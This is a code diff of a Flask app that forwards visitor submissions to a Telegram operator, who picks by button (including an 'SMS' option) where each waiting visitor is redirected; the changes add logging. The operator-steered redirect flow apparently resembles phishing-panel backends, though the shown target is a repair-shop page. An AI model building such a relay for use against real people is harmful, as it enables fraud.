@@ -37,6 +37,8 @@ def send_to_telegram():
 
     pending_redirects[user_id] = None  # Запоминаем пользователя в ожидании редиректа
 
+    print(f"✅ Новый пользователь {user_id} добавлен в ожидание редиректа.")
+
     # 📌 Отправляем сообщение оператору с кнопками
     telegram_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
     payload = {
@@ -58,10 +60,12 @@ def redirect_user(user_id):
     if user_id in pending_redirects:
         url = pending_redirects[user_id]
         if url:
-            pending_redirects.pop(user_id)  # Удаляем пользователя из очереди
+            print(f"🔄 Редирект для пользователя {user_id} на {url}")
             return jsonify({"redirect_url": url})  # Клиент получает URL и редиректится
+        print(f"⏳ Ожидание редиректа для пользователя {user_id}")
         return jsonify({"redirect_url": None})  # Оператор еще не выбрал действие
     else:
+        print(f"⚠️ Ошибка: ID {user_id} не найден!")
         return jsonify({"error": "❌ ID пользователя не найден"}), 404
 
 @app.route('/callback', methods=['POST'])
@@ -86,6 +90,8 @@ def handle_callback():
     if action == "redirect_sms":
         # 📌 Оператор выбрал "SMS" → отмечаем пользователя для редиректа
         pending_redirects[user_id] = "https://www.cikava-kava.com.ua/remont-kavomashyn-dnipro/"
+
+        print(f"✅ Оператор выбрал редирект для пользователя {user_id}")
 
         # Отправляем оператору подтверждение
         telegram_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
